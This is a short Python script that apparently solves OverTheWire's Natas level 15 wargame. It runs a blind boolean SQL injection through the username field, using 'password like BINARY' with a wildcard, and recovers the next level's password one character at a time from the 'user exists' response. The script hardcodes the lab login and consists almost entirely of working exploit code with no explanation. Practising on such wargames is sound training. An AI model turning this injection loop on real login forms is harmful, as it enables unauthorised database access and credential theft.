#!/bin/python
import requests, string

base_url = "http://natas15.natas.labs.overthewire.org/index.php"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"


all_chars = 'acehijmnpqtwBEHINORW03569'

password_dictionary = []
exists_str = "This user exists."
i = 0
while len(password_dictionary) < len(auth_password):
  char = all_chars[i]
  querystr = ''.join(['natas16" and password like BINARY "',''.join(password_dictionary),char,'%'])
  payload = { 'username': querystr }
  print("Testing ",char)
  r = requests.post(base_url, auth=(auth_username, auth_password), data=payload)  
  if exists_str in r.text:
    password_dictionary.append(char)
    print("Password for natas16: {0}").format(''.join(password_dictionary))
  i = i + 1
  if i >= len(all_chars):
    i = 0
print("Password complete.")

